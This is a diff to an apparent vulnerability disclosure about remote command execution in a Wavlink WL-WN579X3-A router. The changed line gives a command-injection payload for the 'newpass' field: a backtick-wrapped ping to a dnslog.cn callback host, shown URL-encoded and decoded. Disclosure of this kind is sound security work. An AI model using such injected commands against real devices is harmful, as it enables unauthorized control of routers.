@@ -33,7 +33,7 @@ It not just affect the newest firmware, but alse the older version (at the newes
 
 ![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/1.png?raw=true)     
 
-Set the 'newpass' value as %60ping%20-c%201%203vkslf.dnslog.cn%60     
+Set the 'newpass' value as %60ping%20-c%201%203vkslf.dnslog.cn%60 (\`ping -c 1 3vkslf.dnslog.cn\`)     
 
 ![](https://github.com/s0duku/issues/blob/main/wavlink/WL-WN579X3-A_RCE/9.png?raw=true)   
 
